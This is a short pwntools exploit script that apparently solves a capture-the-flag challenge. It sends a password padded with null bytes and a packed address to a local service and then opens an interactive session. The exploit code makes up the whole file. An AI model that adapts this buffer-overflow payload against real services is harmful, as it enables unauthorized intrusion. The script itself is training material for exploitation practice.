# Import pwntools
from pwn import *

# Create the remote connection to the challenge
target = remote("localhost", 5000)
# target = remote('pwn1.chal.ctf.westerns.tokyo', 12482)

# Print out the starting prompt
print(target.recvuntil(b"password.").decode())

# Create the payload
# does not work using socker.sh, likely because of 0x04 -> EOT (End of Transmission) character over network
# not sure how to configure socat to accept this character to the stream.
payload = b"P@SSW0RD" + b"\x00" * 12 + p32(0x0804A080)

# Send the payload
target.sendline(payload)

# print(target.recvall())
# Drop to an interactive shell, so we can read everything the server prints out
target.interactive()

# print(target.recvall())
